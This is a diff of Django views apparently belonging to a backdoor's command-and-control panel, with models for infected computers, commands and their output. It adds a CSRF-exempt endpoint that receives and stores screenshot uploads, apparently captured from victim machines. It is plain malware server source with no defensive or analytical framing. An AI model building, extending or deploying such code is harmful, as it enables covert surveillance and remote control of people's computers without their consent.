@@ -1,9 +1,12 @@
 from django.shortcuts import render, redirect
 from django.http import JsonResponse, HttpResponse
-from .models import Output, Computer, Command
-from .forms import CodeForm
+from .models import Output, Computer, Command, Files
+from .forms import CodeForm, ScreenShotForm
 from datetime import timedelta
 from django.utils import timezone
+from django.views.decorators.csrf import csrf_exempt
+
+
 def home(request):
     context = {
         'computers': Computer.objects.all()
@@ -43,3 +46,15 @@ def clean(request, pk):
     computer = Computer.objects.all().filter(id=pk)[0]
     Output.objects.filter(target=computer).delete()
     return redirect("computer-detail", pk)
+
+@csrf_exempt
+def screenshot(request):
+    if request.method == 'POST':
+        form = ScreenShotForm(request.POST, request.FILES)
+        if form.is_valid():
+            image = request.FILES['file']
+            Files.objects.create(file=image)
+    else:
+        form = ScreenShotForm()
+    
+    return render(request, "backdoor/screenshot.html", {'form':form})
